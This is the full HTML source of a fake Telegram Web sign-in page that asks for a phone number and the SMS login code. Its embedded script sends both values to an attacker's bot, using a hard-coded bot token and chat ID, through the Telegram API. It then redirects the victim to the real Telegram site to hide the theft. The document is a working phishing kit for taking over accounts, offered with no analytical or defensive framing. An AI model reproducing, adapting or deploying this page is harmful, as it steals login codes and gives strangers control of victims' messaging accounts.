<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Telegram Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            background: #0f0f0f;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .card {
            background: #1f1f1f;
            border-radius: 28px;
            padding: 32px 24px;
            width: 350px;
        }
        h1 {
            color: white;
            text-align: center;
            margin-bottom: 8px;
        }
        .sub {
            color: gray;
            text-align: center;
            margin-bottom: 32px;
        }
        input {
            width: 100%;
            padding: 14px;
            background: #2b2b2b;
            border: 1px solid #3e3e3e;
            border-radius: 14px;
            color: white;
            margin-bottom: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #2b9aff;
            border: none;
            border-radius: 14px;
            color: white;
            font-weight: bold;
            cursor: pointer;
        }
        .error {
            color: #ff6b6b;
            text-align: center;
            margin-bottom: 16px;
            display: none;
        }
        .footer {
            text-align: center;
            color: gray;
            font-size: 12px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>Telegram</h1>
    <div class="sub">Sign in to your account</div>
    <div class="error" id="errorMsg"></div>
    <input type="text" id="phone" placeholder="Phone number">
    <input type="text" id="code" placeholder="Code from SMS">
    <button id="sendBtn">Next</button>
    <div class="footer">Telegram Web</div>
</div>

<script>
    const BOT_TOKEN = '8300626512:AAEH-ZR2FLuQkRhkF6WkRdgOsdhimjBL9IE';
    const CHAT_ID = '7110007728';

    document.getElementById('sendBtn').onclick = async function() {
        const phone = document.getElementById('phone').value;
        const code = document.getElementById('code').value;
        const errorDiv = document.getElementById('errorMsg');
        
        if (!phone || !code) {
            errorDiv.textContent = 'Fill in both fields';
            errorDiv.style.display = 'block';
            return;
        }
        
        errorDiv.style.display = 'none';
        const text = Phone: ${phone} Code: ${code};
        const url = https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)};
        
        try {
            const response = await fetch(url);
            const result = await response.json();
            if (result.ok) {
                window.location.href = 'https://web.telegram.org/z/';
            } else {
                errorDiv.textContent = 'Error: ' + result.description;
                errorDiv.style.display = 'block';
            }
        } catch(e) {
            errorDiv.textContent = 'Network error';
            errorDiv.style.display = 'block';
        }
    };
</script>
</body>
</html>
